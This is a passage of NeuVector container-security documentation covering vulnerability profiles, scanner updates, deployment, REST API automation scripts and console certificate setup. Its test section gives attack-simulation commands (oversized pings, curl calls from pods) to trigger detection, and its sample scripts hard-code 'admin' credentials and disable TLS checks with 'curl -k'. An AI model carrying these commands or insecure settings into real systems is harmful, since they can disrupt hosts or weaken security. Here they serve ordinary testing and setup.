unprotected by NeuVector during run-time, protected by NeuVector rules (in a Monitor or Protect mode), or unaffected in run-time (e.g. an image scanned with this vulnerability has no running containers). The Protection State column color scheme is:  Black = unaffectedGreen = protected by NeuVector with Monitor or Protect modeRed = unprotected by NeuVector, still in Discover mode  The Impact analysis window (showing affected images, nodes, containers) color scheme is:  Black = unaffected. There are no containers using this image in productionPurple = running in Monitor mode in productionDark Green = running in Protect mode in productionLight Blue = running in Discover mode in production (unprotected)  The Impact colors are meant to correspond to the run-time protection colors for Discover, Monitor and Protect modes in other places in the NeuVector console.  Accepting Vulnerabilities​  You can 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.  To Accept a vulnerability globally, go to the Security Risks -&gt; Vulnerabilities page and select the vulnerability, then Accept. This will create a Vulnerability Profile for this CVE globally.    To Accept a vulnerability found in an image scan, open the image scan results in Assets -&gt; Registries, pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this image. NOTE: This action will create a Vulnerability Profile entry for this CVE in this IMAGE only.    To Accept a vulnerability found in a container in Assets -&gt; Containers, select the vulnerability and pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this container. NOTE: This action will create a Vulnerability Profile for this CVE in this NAMESPACE only.    This action can also be performed in Assets -&gt; Nodes, which will create a Vulnerability Profile for the CVE for all containers, images and namespaces.  important Globally Accepted vulnerabilities are excluded from the view in Security Risks -&gt; Vulnerabilities and in exported reports from this page. Accepted vulnerabilities which are limited to specific images or namespaces will continue to show in the view, but be excluded for reports where the Advanced Filter limits the view to those images or namespaces.  Managing Vulnerability Profiles​  Each accepted vulnerability/CVE creates an entry in the Security Risks -&gt; Vulnerability Profile list. These entries can be edited to add or remove attributes such as image name(s) and namespace(s).    New accepted vulnerabilities can also be added here by entering the CVE name to be Accepted.

The scanner image is updated on the NeuVector Docker Hub registry with the latest CVE database frequently, as often as daily if there are updates. To update the CVE database used in scanning, simply pull and deploy the latest Scanner image. The latest database version number can be found listed here.  A container called the Updater performs the task of restarting the scanner pods in order to force a pull of the latest image, which will update the CVE database. To automatically check for updates and update the scanner, an updater cron job can be created.  By default, the updater cron job shown below is automatically started from the sample deployment yaml files for Kubernetes and OpenShift. This will automatically check for new CVE database updates through new scanner versions published on the NeuVector Docker hub registry. Manual updates on docker native deployments are shown below. For OpenShift deployments or others where images have to be manually pulled from NeuVector, the scanner with the 'latest' tag should be pulled from NeuVector to update the CVE database.  For registry scanning, if the box 'Rescan after CVE DB update' is enabled, all images in that registry will be rescanned after a CVE database update. For run-time scanning, all running assets will be rescanned after a CVE database update if the Auto-Scan feature is enabled.  Updater Cron Job​  This cron job is deployed by NeuVector automatically as part of the sample deployment, so is typically not required to start manually.  The Updater is a container image which, when run, restarts the scanner deployment, forcing the pull of the latest Scanner image. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up.

Generating Network Violations on Kubernetes​  To generate a violation from a nodejs pod, find a pod:  kubectl get pod -n demo   Then try some violations (replace node-pod-name):  kubectl exec node-pod-name curl www.google.com -n demo   Or find the internal IP address of another node pod, like 172.30.2.21 in the example below, to connect from one node to another:  kubectl exec node-pod-name curl 172.30.2.21:8888 -n demo   Generate a Threat/Attack​  To simulate an attack, log into a container, then try a ping attack:  kubectl exec -it node-pod-name bash -n demo   Use the internal IP of another node pod:  ping 172.30.2.21 -s 40000   For all of the above, you can view the security events in the NeuVector console Network Activity map, as well as the Notifications tab.  Process and File Protection Tests​  Try various process and file activity by exec'ing into a container and running commands such as apt-get update, ssh, scp or others. Any process activity or file access not allowed will generate alerts in Notifications.  Registry Scanning and Admission Control​  A popular test is to configure image scanning of a registry in Assets -&gt; Registries. After the scan is complete, configure an Admission Control rule in Policy. Be sure to enable Admission Controls and set a rule to Deny when there are high vulnerabilities in an image. Then pick an image that has high vulnerabilities and try to deploy it in Kubernetes. The deployment will be blocked in Protect mode and you will see an event in Notifications -&gt; Security Risks.  More advanced admission control testing can be done using different criteria in rules, or combining criteria.

Please be sure to review the online documentation for each step necessary during deployment. Often deployments are attempted by just copying the sample yaml files and deploying them without reviewing the steps prior, such as properly configuring registries, secrets, or RBACs/rolebindings.  Initial Deployment​  Check that the NeuVector containers can be pulled with correct authentication. Check the secret used and make sure the cluster is able to access the appropriate registry.Make sure the changes to the yaml required (e.g. NodePort or LoadBalancer) or Helm values settings are set appropriately.Check the platform and container run-time and make changes as needed (e.g. PKS, containerd, CRI-O).  Login and Initial Configuration​  Check to make sure appropriate access to the manager (IP address, port, route) is allowed through firewalls.  Ongoing Operation​  Directory integration. NeuVector supports specific configurations for LDAP/AD and other integrations for groups and roles. Contact NeuVector for additional troubleshooting steps and a tool for AD troubleshooting.Registry scanning. Most issues are related to registry authentication errors or inability for the controller to access the registry from the cluster.For performance issues, make sure the scanner is allocated enough memory for scanning large images. Also, CPU and memory minimums can be specified in the pod policy to ensure adequate performance at scale.Admission Control. See the Troubleshooting section in the section Security Risks... -&gt; Admission Controls.  Updating​  Use rolling updates for the controller. If you are rebooting hosts, make sure to monitor the controllers as they move to other hosts, or redeploy on the rebooted hosts, to make sure they are able to start, join the controller cluster, and stabilize/sync. Rebooting all hosts at once or too quickly can result in unknown states for the controllers.Use a persistent volume claim to store the NeuVector configuration for the case that all controllers/nodes go down in the cluster.When updating to a new version, review the online documentation to identify changes/additions to the yaml required, as well as other changes such as rolebindings or new services (e.g. admission control webhook, persistent volume claim etc).

The multi-vector security platform is able to combine network security, container inspections, and host security to protect containers at run-time.

If there is a new release available, pull it from Docker Hub. It is recommended to use a ‘rolling update’ strategy to keep at least one Allinone or Controller container running at any time during an update.  imporant Host OS updates, reboots, and orchestrator updates can cause pods to be evicted or stopped. If a Controller is affected, and there are no other Controllers active to maintain the state, the Controllers can become available for some time while new controllers are started, a cluster is formed with a leader, and the persistent storage backup of the configuration is attempted to be accessed to restore the cluster. Be careful when scheduling host or orchestrator updates and reboots which may affect the number of controllers available at any time. See the Pod Disruption Budget below for possible ways to mitigate this. If deployment was done using the NeuVector Helm charts, updating will take care of additional services, rolebindings or other upgrade requirements. If updates are done manually or there is only one Allinone or Controller running, please note that current network connection data is NOT stored and will be lost when the NeuVector container is stopped. NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  To manually update NeuVector using docker-compose:  sudo docker-compose -f &lt;filename&gt; down   Note that if no filename is specified then the docker-compose.yml file is used.  Make sure the docker-compose.yml or other appropriate file is edited with the desired image version, if necessary, then:  $sudo docker-compose -f &lt;filename&gt; up -d   note We recommend that all NeuVector components be updated to the most recent version at the same time. Backward compatibility is supported for at least one minor version back. Although most older versions will be backward compatible, there may be exceptions which cause unexpected behavior.

Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.

Each type of NeuVector container has a unique purpose and may require special performance or node selection requirements for optimum operation.  The NeuVector open source images are hosted on Docker Hub at /neuvector/{image name}.  See the Onboarding/Best Practices section to download an on boarding guide.  Deploy using Kubernetes, OpenShift, Rancher, or other Kubernetes-based tools​  To deploy NeuVector using Kubernetes, OpenShift, Rancher or other orchestration tools, see the preparation steps and sample files in the section Deploying NeuVector. This deploys manager, controller, scanner, and enforcer containers. For simple testing using the NeuVector Allinone container, see the section Special Use Cases with Allinone.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Automated deployments are supported using Helm, Red Hat/Community Operators, the rest API, or a Kubernetes ConfigMap. See the section Deploy Using ConfigMap for more details on automating deployment.  Deploy using Docker Native​  Before you deploy NeuVector with docker run or compose, you MUST set the CLUSTER_JOIN_ADDR to the appropriate IP address. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the docker-compose files for both allinone and enforcer. For example:  - CLUSTER_JOIN_ADDR=192.168.33.10   For Swarm-Based deployments, also add the following environment variable:  - NV_PLATFORM_INFO=platform=Docker   See the section Deploying NeuVector -&gt; Docker Production Deployment for instructions and examples.  Backing Up Configuration Files​  By default NeuVector stores various config files in /var/neuvector/config/backup on the Controller or Allinone node.  This volume can be mapped to persistent storage to maintain configuration. Files in the folder may need to be deleted in order to start fresh.  Volume Mapping​  Make sure volumes are mapped properly. NeuVector requires these to operate (/var/neuvector is only required on controller/allinone). For example:  volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Also, you may need to ensure that other tools are not blocking access to the docker.sock interface.  Ports and Port Mapping​  Make sure the required ports are mapped properly and open on the host. The Manager or Allinone requires 8443 (if using the console). The Allinone and Controller requires 18300, 18301, 18400, 18401 and optionally 10443, 11443, 20443, 30443. The Enforcer requires 18301 and 18401.  Note: If deploying docker native (including SWARM) make sure there is not any host firewall blocking access to required ports such as firewalld. If enabled, the docker0 interface must be added as a trusted zone for the allinone/controller hosts.  Port Summary​  The following table lists communications from each NeuVector container. The Allinone container combines the Manager, Controller and Enforcer containers so requires the ports listed for those containers.    The following table summarizes the listening ports for each NeuVector container.    Additional Ports​  In version 5.1, a new listener port has been added on 8181 in the controller for local controller communication only.  tcp 0 0 :::8181 :::* LISTEN 8/opa  ","version":"Next 🚧","tagName":"h3"},{"title":"REST API and Automation","type":0,"sectionRef":"#","url":"/next/automation/automation","content":"","keywords":"","version":"Next 🚧"},{"title":"NeuVector Automation​","type":1,"pageTitle":"REST API and Automation","url":"/next/automation/automation#neuvector-automation","content":" There are many automation features in NeuVector to support the entire CI/CD workflow, including:  Jenkins plug-in to automated scanning during buildRegistry scanning to automate repository monitoringAdmission Control policies to allow/deny unauthorized deploymentsCIS benchmarks automatically run on hostsHelm chart on github for automated deployment on KubernetesResponse rules to automate responses to security eventsREST API for building automation of any NeuVector function  REST API​  The NeuVector solution can be managed using the REST API. Below are common examples of automation using the REST API. The REST API yaml doc is best viewed in the Swagger 2.0 viewer. The REST API documentation is below in a yaml file which is best viewed in a reader such as swagger.io.  Latest update can be found here. Also in the NeuVector GitHub source code repo. The apis.yaml from the main truck can include unreleased features. It is recommended to download the appropriate released version source code and extract the apis.yaml from the controller/api folder.  important If you are making REST API calls with username/password, please be sure make a DELETE call against /v1/auth when done. There is a maximum of 32 concurrent sessions for each user. If this is exceeded, an authentication failure will occur.  NeuVector also support Response Rules to automate common responses to security events or vulnerabilities detected. Please see the section Security Policy -&gt; Response Rules for more details.  Expose REST API in Kubernetes​  To expose the REST API for access from outside of the Kubernetes cluster, enable port 10443.  apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller-api namespace: neuvector spec: ports: - port: 10443 name: controller-api protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   note type: NodePort can also be used instead of LoadBalancer.  note If using type LoadBalancer, set the controllerIP in the examples below to the external IP or URL for the loadbalancer.  Authentication for REST API​  The REST API supports two types of authentication: username/password and token. Both can be configured in Settings -&gt; Users, API Keys &amp; Roles, and be associated with default or custom roles to limit access privileges. The examples below show username/password based authentication where a token is created first, then used in subsequent REST API calls. If using a token, it can be used directly in each REST API call. Note: username based connections have a limited number of concurrent sessions, so it is important to delete the username token as shown below when finished. Token based authentication does not have a limit, but expire according to the time limit selected when created.  For token-based authentication, see the following screen shots and example call. Be sure to copy the secret and token once created, as there is no way to retrieve this after the screen in closed.        Trigger Vulnerability Scanning from a script​  NeuVector can be triggered automatically to scan an image for vulnerabilities. This can be done by configuring a registry/repository to be monitored, using the NeuVector Jenkins plug-in, or using the REST API. Please see the section on Scanning &amp; Compliance for more detail.  The sample script below shows how to remotely pull the container, run it, and scan it. It can be triggered from a Jenkins task (remote shell) or any CI/CD tool. A JSON parser tool (jq) is also used.  Be sure to enter the controller IP address in the script and change the container image name to the one you wish to scan. Also, update the username/password fields.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;&quot; _registryUsername_=&quot;&quot; _registryPassword_=&quot;&quot; _repository_=&quot;alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_   note You may need to install jq sudo yum install jq   For Kubernetes based deployments you can set the Controller IP as follows:  _podNAME_=`kubectl get pod -n neuvector -o wide | grep &quot;allinone\\|controller&quot; | head -n 1 | awk '{print $1}'` _controllerIP_=`kubectl exec $_podNAME_ -n neuvector -- consul info | grep leader_addr | awk -F&quot;:| &quot; '{print $3}'`   note In a multiple controller deployment the requests must be sent to a single controller IP so multiple requests for status of long running image scans go to the controller performing the scan.

The following sample creates a new Group based on the container label nv-service-type=data, and another Group for label nv-service-type=website. A rule is then created to allow traffic from the wordpress container to the mysql container using only the mysql protocol.  Be sure to update the username and password for access to the controller.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mydb&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;data&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mywp&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;website&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -X &quot;PATCH&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;insert&quot;: {&quot;rules&quot;: [{&quot;comment&quot;: &quot;Custom WP Rule&quot;, &quot;from&quot;: &quot;mywp&quot;, &quot;applications&quot;: [&quot;MYSQL&quot;], &quot;ports&quot;: &quot;any&quot;, &quot;to&quot;: &quot;mydb&quot;, &quot;action&quot;: &quot;allow&quot;, &quot;id&quot;: 0}], &quot;after&quot;: 0}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/policy/rule&quot; curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;   If the Groups already exist in NeuVector then the new rule can be created, skipping the Group creation steps.

The 5.x images are accessible from Docker Hub with the appropriate tag, e.g. neuvector/controller:(version). For 4.x versions see the 4.x Docs.  NeuVector provides a powerful end-to-end container security platform. This includes end-to-end vulnerability scanning and complete run-time protection for containers, pods and hosts, including:  CI/CD Vulnerability Management &amp; Admission Control. Scan images with a Jenkins plug-in, scan registries, and enforce admission control rules for deployments into production.Violation Protection. Discovers behavior and creates a whitelist based policy to detect violations of normal behavior.Threat Detection. Detects common application attacks such as DDoS and DNS attacks on containers.DLP and WAF Sensors. Inspect network traffic for Data Loss Prevention of sensitive data, and detect common OWASP Top10 WAF attacks.Run-time Vulnerability Scanning. Scans registries, images and running containers orchestration platforms and hosts for common (CVE) as well as application specific vulnerabilities.Compliance &amp; Auditing. Runs Docker Bench tests and Kubernetes CIS Benchmarks automatically.Endpoint/Host Security. Detects privilege escalations, monitors processes and file activity on hosts and within containers, and monitors container file systems for suspicious activity.Multi-cluster Management. Monitor and manage multiple Kubernetes clusters from a single console.  Other features of NeuVector include the ability to quarantine containers and to export logs through SYSLOG and webhooks, initiate packet capture for investigation, and integration with OpenShift RBACs, LDAP, Microsoft AD, and SSO with SAML. Note: Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.  ","version":"Next 🚧","tagName":"h3"},{"title":"Security Containers​","type":1,"pageTitle":"5.x Overview","url":"/next/basics/overview#security-containers","content":" The NeuVector run-time container security solution contains four types of security containers: Controllers, Enforcers, Managers, and Scanners. A special container called the Allinone is also provided to combine the Controller, Enforcer, and Manager functions all in one container, primarily for docker native deployments.  NeuVector can be deployed on virtual machines or on bare metal systems with a single os.  Controller​  The Controller manages the NeuVector Enforcer container cluster. It also provides REST APIs for the management console. Although typical test deployments have one Controller, multiple Controllers in a high-availability configuration is recommended. 3 controllers is the default in the Kubernetes Production deployment sample yaml.  Enforcer​  The Enforcer is a lightweight container that enforces the security policies. One enforcer should be deployed on each node (host), e.g. as a Daemon set.  note For Docker native (non Kubernetes) deployments the Enforcer container and the Controller cannot be deployed on the same node (except in the All-in-One case below).  Manager​  The Manager is a stateless container that provides a web-UI (HTTPS only) console for users to manage the NeuVector security solution. More than one Manager container can be deployed as necessary.  All-in-One​  The All-in-One container includes a Controller, an Enforcer and a Manager in one package. It's useful for easy installation in single-node or small-scale deployments.  Scanner​  The Scanner is a container which performs the vulnerability and compliance scanning for images, containers and nodes. It is typically deployed as a replicaset and can be scaled up to as many parallel scanners as desired in order to increase the scanning performance. The Controller assigns scanning jobs to each available scanner in a round-robin fashion until all scans are completed. The scanner also contains the latest CVE database and is updated regularly by NeuVector.  Updater​  The Updater is a container which when run, updates the CVE database for NeuVector. NeuVector regularly publishes new scanner images to include the latest CVE for vulnerability scans. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up, forcing a pull of an updated scanner image.  Architecture​  Here is a general architecture overview of NeuVector. Not shown is the separate scanner container, which can also be run as a stand-alone pipeline scanner.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deployment Examples​","type":1,"pageTitle":"5.x Overview","url":"/next/basics/overview#deployment-examples","content":" For common deployment patterns and best practices see the Onboarding/Best Practices section.  All-in-One and Enforcers​  This deployment is ideal for single-node or small-scale environments, for example for evaluation, testing, and small deployments. An All-in-One container is deployed on one node, which can also be a node with running application containers. An Enforcer can be deployed on all other nodes, with one Enforcer required on each node you wish to protect with NeuVector. This is also useful for native Docker deployments where a controller and enforcer cannot run on the same host.  Controller, Manager and Enforcer Containers​  This is a more generic deployment use case which consists one or more Controllers, one Manager and a set of Enforcers. The Controller and Manager can be deployed on the same node or on different nodes than the Enforcer.  All-in-One Only​  You can deploy just the allinone container for registry scanning, using the Jenkins plug-in, or simple one node testing of NeuVector.  Controller Only​  It is possible to deploy a single Controller container and/or scanner to manage vulnerability scanning outside a cluster, for example for use with the Jenkins plug-in. Registry scanning can also be performed by the Controller using the REST API exclusively, but typically a Manager container is also desired in order to provide console based configuration and results viewing for registry scanning.

In Protect mode (inline firewall), the Enforcer requires CPU and memory to filter connections with deep packet inspection and hold them to determine whether they should be blocked/dropped. Generally, with 1GB of memory and a shared CPU, the Enforcer should be able to handle most environments while in Protect mode. For throughput or latency sensitive environments, additional memory and/or a dedicated CPU core can be allocated to the NeuVector Enforcer container. For performance tuning of the Controller and Scanner for registry scanning, see System Requirements above. For additional advice on performance and sizing, see the Onboarding/Best Practices section. Throughput​ As the chart below shows, basic throughput benchmark tests showed a maximum throughput of 1.3 Gbps PER NODE on a small public cloud instance with 4 CPU cores. For example, a 10 node cluster would then be able to handle a maximum of 13 Gbps of throughput for the entire cluster for services in Protect mode. This throughput would be projected to scale up as dedicated a CPU is assigned to the Enforcer, or the CPU speed changes, and/or additional memory is allocated. Again, the scaling will be dependent on the type of network/application traffic of the workloads. Latency​ Latency is another performance metric which depends on the type of network connections. Similar to throughput, latency is not affected in Monitor mode, only for services in Protect (inline firewall) mode. Small packets or simple/fast services will generate a higher latency by NeuVector as a percentage, while larger packets or services requiring complex processing will show a lower percentage of added latency by the NeuVector enforcer. The table below shows the average latency of 2-10% benchmarked using the Redis benchmark tool. The Redis Benchmark uses fairly small packets, so the the latency with larger packets would expected to be lower.

The main way to lower the actual latency (microseconds) in Protect mode is to run on a system with a faster CPU.

A possible reason could be that the certificate has not yet been imported into macOS login certificates store. Another possibility is that an existing certificate has not yet been configured to be trusted. This will disallow the user from accepting it and proceeding to the NeuVector login page with the use of Chrome as illustrated with the example shown below:    Corrective steps can be taken to enable Chrome on accepting the self-signed certificate placed on macOS Keychain store. This can be done by configuring the NeuVector’s certificate to be trusted using the Mac’s Keychain Access application. This is with the assumption that the certificate does indeed exists in the macOS Keychain Access store. We will first look at how to export a certificate from an existing NeuVector node from one system, and later can be imported into another system. There are 2 ways to go about exporting the certificate which we will go over below. They are, using the Chrome browser, and using the macOS Keychain Access application.  Certificate export using Chrome​  The screen capture below illustrates how to access the NeuVector certificate using Chrome.    To export the certificate, drag and drop the certificate to a location of choice.    Certificate export using macOS Keychain-Access​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and double click on the application. This launches the Keychain Access application. Select the NeuVector certificate and choose Export “NeuVector” from the dropdown menu. This will allow the export of the certificate to a location of choice.    Launching the macOS Keychain-Access Application​  There are two ways to launch the macOS Keychain Access Application. This can be done by searching from the macOS, which has been described from the steps immediately above, or using the Chrome browser.  Launching Keychain-Access from the Chrome Browser​  Settings &gt; Advanced &gt; Manage certificates    Clicking on the Manage certificates as shown from above launches the Mac’s Keychain Access application as shown below.    Certificate import into the macOS Keychain-Access Store​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and click on the application. Then import the certificate by drag and dropping a NeuVector certificate (example: nvcertificate.cer) into the Certificate right pane of the Keychain Access application. Now that the certificate has been imported, it is not yet trusted. The following is an example showing the default trust settings after a NeuVector’s certificate has been imported into the Keychain Access application.    Notice that none of the parameters have been configured, and it is not trusted by default. It needs to be configured to be trusted to allow the user to access the login page using the Chrome browser.  Enabling trust for the NeuVector Certificate​  The following steps details on how to enable trust for the NeuVector certificate in the Keychain Access store.    Double clicking on the NeuVector certificate from the screen capture above will bring up another popup dialog box that allows the trust permissions to be configured for different parameters. Configure Secure Sockets Layer (SSL) to “Always Trust”.    Close the dialog box and click on ‘Update Settings” after entering the Mac logon user’s password from the following popup dialog box.    This finalizes the trust configurations. Next, clear all Chrome browser’s cache, close all Chrome browsers, and relaunch the Chrome browser. Next visit the NeuVector login page, and upon clicking on the “Advanced” link, the Proceed to … (unsafe) link will be shown. Clicking on the Proceed to … (unsafe) will allow the user to proceed to the username and password login page.    Below shows a screen capture that allows the user to proceed to the NeuVector login page after Proceed to … (Unsafe) link is clicked.

This is why it can't be changed to 443.  If you are trying to access the console from your corporate network. Here is the way to use the ClusterIP service and ingress HTTPS redirect to achieve that.  First, create a certificate for HTTPS termination. Here is an example,  openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/CN=mycloud.domain.com&quot; kubectl create secret tls neuvector-ingress-tls -n neuvector --key=&quot;tls.key&quot; --cert=&quot;tls.crt&quot;   Then, use the following yaml file to expose the 443 port that redirects the HTTPS connection to the manager.  apiVersion: v1 kind: Service metadata: name: neuvector-cluster-webui namespace: neuvector spec: ports: - port: 443 targetPort: 8443 protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: extensions/v1beta1 kind: Ingress metadata: name: neuvector-ingress-webui namespace: neuvector annotations: ingress.mycloud.net/ssl-services: ssl-service=neuvector-cluster-webui spec: tls: - hosts: - cloud.neuvector.com secretName: neuvector-ingress-tls rules: - host: cloud.neuvector.com http: paths: - path: backend: serviceName: neuvector-cluster-webui servicePort: 443   You will need to change the annotation for the ingress address from ingress.mycloud.net to your appropriate address.  This example uses the URL cloud.neuvector.com. After the ingress service is created, you can find it's external IP. You then can configure the hosts file to point cloud.neuvector.com to that IP. After that, you should be able to browse to https://cloud.neuvector.com (the url you choose to use).  Using SSL Passthrough Instead of Redirect​  To use TLS/SSL passthrough instead of the redirect example above (supported on some ingress controllers such as nginx), make sure the ingress controller is configured appropriated for passthrough, and the appropriate annotation is added to the ingress.

To map a group to a role and namespace, click Add to create a new mapping. Select a global role or none. If admin or FedAdmin is selected, this gives write access to all namespaces. If a different role is selected, it can be further restricted by selecting the desired namespace(s).    The following example provides some possible mappings. Demo_admin can read/view all namespaces but has admin rights to the demo and demo2 namespaces. System_admin only has admin rights to the kube-system namespace. And fed_admins has the preset fedAdmin role which gives write access to all resources across multiple clusters.    important If the user is in multiple groups, the role will be 'first matched' in the order listed and group's role assigned. Please adjust the order of configuration for proper behavior by dragging and dropping the mappings to the appropriate order in the list.  Multi-Cluster FedAdmin and Admin Roles for Primary and Remote Management​  When a cluster is promoted to be a Primary cluster, the admin becomes a FedAdmin automatically. The FedAdmin can perform operations on the primary such as generate a federation token for connecting a remote cluster as well as creating federated security rules such as network, process, file, and admission control rules.  Multi-cluster management roles are as follows:  On any cluster, a local admin or a Rancher SSO admin can promote the cluster to become a primary.Ldap/SSO/SAML/OIDC users with admin roles are not able to promote a cluster to primary.Only the FedAdmin can generate the token required to join a remote cluster to the primary.Any admin, including ldap/sso/saml/oidc users can join a remote cluster to the primary if they have the token.Only the FedAdmin can create a new user as a FedAdmin (or FedReader) or assign the FedAdmin (or FedReader) role to an existing user (including ldap/sso/saml/oidc users).

As of the July release, only EKS is supported for the billing adapter (see below options for other environments such as Rancher, Kubernetes, OpenShift etc). Each cluster can report its usage (nodes) independently, or an aggregated node count for a multi-cluster deployment can be reported. An aggregated, multi-cluster deployment can take advantage of the volume discount tiers offered by pooling all nodes across clusters into a single usage billing calculation.  note All clusters in PAYG billing (single, primary, remotes) must be running NeuVector version 5.2.0 or later.  Single Cluster Usage Billing​  Each cluster onto which you have deployed the PAYG billing adapter through the marketplace will report usage information for your AWS account.  Multi-cluster Usage Billing​  To be able to aggregate the node counts from multiple clusters in order to take advantage of volume discounts, the clusters must have been configured for Multi-cluster federation as described in the NeuVector docs. NeuVector on the Primary cluster MUST have been deployed through the AWS Marketplace, with the billing adapter installed in the primary cluster, in order to be able to report the primary and all downstream remote cluster node counts. Do not deploy NeuVector through the marketplace on downstream remote clusters. Use standard deployment methods (Helm, Operator, kubectl etc) described in the NeuVector docs on remote clusters.  Enabling PAYG NeuVector Prime Billing for Existing NeuVector Clusters​  There are several options to enable 